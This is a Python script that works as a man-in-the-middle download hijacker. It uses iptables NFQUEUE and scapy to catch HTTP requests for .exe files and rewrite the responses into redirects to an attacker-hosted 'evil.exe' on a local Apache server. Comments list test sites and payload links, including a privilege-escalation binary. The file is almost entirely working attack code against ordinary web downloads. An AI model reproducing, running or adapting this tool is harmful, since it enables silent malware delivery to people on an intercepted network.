#!/usr/bin/env python
#!usr/bin/env python
#iptables -I OUTPUT -j NFQUEUE --queue-num 1001 && iptables -I INPUT -j NFQUEUE --queue-num 1001
#dport     = http >> request to http
#sport     = http >> response
#https://www.programcreek.com/python/example/81033/scapy.all.Raw
#payloads
#"https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe"
#"https://www.rarlab.com/rar/winrar-x64-610b2.exe"
#test sites
#http://www.speedbit.com/
#http://demo.borland.com/testsite/download_testpage.php
#http://startrinity.com/VoIP/SipTester/siptester_latest/StarTrinity.Installer.exe

import netfilterqueue
import scapy.all as sc
import subprocess
import argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url-download',dest='url',help='Enter url to a executable download link to replace with target download. Leave blank to default to Kali apache server executable.')
    parser.set_defaults(url=set_default_url())
    options = parser.parse_args()
    return options



def set_default_url(): #making this function to automatically set malicious url to our own apache2 download link with evil stuff
    pipecmd_ip = "/sbin/ip route | awk '/src/ { printf $9 }'"
    ip = subprocess.check_output(pipecmd_ip,shell=True)
    ip_decoded = ip.decode('utf-8')
    url = 'http://'+ip_decoded+'/downloads/evil.exe'
    return url


def iptable_conf():
    pipecmd_lm = 'iptables -I OUTPUT -j NFQUEUE --queue-num 1001 && iptables -I INPUT -j NFQUEUE --queue-num 1001' #should add args to choose whether to attack local or remote machine
    pipecmd_rh = 'iptables -I FORWARD -j NFQUEUE --queue-num 1001'
    pipecmd_ap = 'service apache2 start'
    pipecmd_if = 'echo '
    
    input_checker = False
    while input_checker == False:
        input1 = input('Enter \'L\' to capture web traffic from a local machine or \'R\' for a remote machine\n:')
        if input1 == 'L':
            print("Local host chosen")
            input_checker = True
            return subprocess.check_output(pipecmd_lm,shell=True), subprocess.check_output(pipecmd_ap,shell=True)
        if input1 == 'R':
            print("Remote host chosen")
            input_checker = True
            return subprocess.check_output(pipecmd_rh,shell=True), subprocess.check_output(pipecmd_ap,shell=True)


def replacer(rpkt,url):
    rpkt[sc.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: {}\n\n".format(opt.url)
    del rpkt[sc.IP].len    
    del rpkt[sc.IP].chksum
    del rpkt[sc.TCP].chksum
    return rpkt


ack_list = []
def process_packet(pkt):

    sc_pkt = sc.IP(pkt.get_payload())
    if sc_pkt.haslayer(sc.TCP): #MAKE SURE THIS WORKS!!!
        if sc_pkt.haslayer(sc.Raw):
            if sc_pkt[sc.TCP].dport == 80:
                if '.exe' in str(sc_pkt[sc.Raw].load): #if exec dl file in request packet
                    #could add options to input type of file we want to replace
                    print('[+] exe request packet caught')
                    #print(sc_pkt.show())
                    ack_list.append(sc_pkt[sc.TCP].ack)
            elif sc_pkt[sc.TCP].sport == 80: #if it's a response
                if sc_pkt[sc.TCP].seq in ack_list: #if ack request matches seq response 
                    ack_list.remove(sc_pkt[sc.TCP].seq) #remove ack number from list 
                    print('\n[+] Found target file to replace\n')
                    print(sc_pkt.show())
                    payload = replacer(sc_pkt,opt.url)
                    pkt.set_payload(bytes(sc_pkt))
    pkt.accept()


try:
    opt = get_args()
    iptable_conf()
    print('Replacing download with {}'.format(opt.url))
    print("IPtables configured")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1001, process_packet)
    queue.run()
    
    
except KeyboardInterrupt:
    subprocess.check_output('iptables -F',shell=True)
    pipecmd_ap_off = 'service apache2 stop'
    subprocess.check_output(pipecmd_ap_off,shell=True)
    print('\niptables flushed')
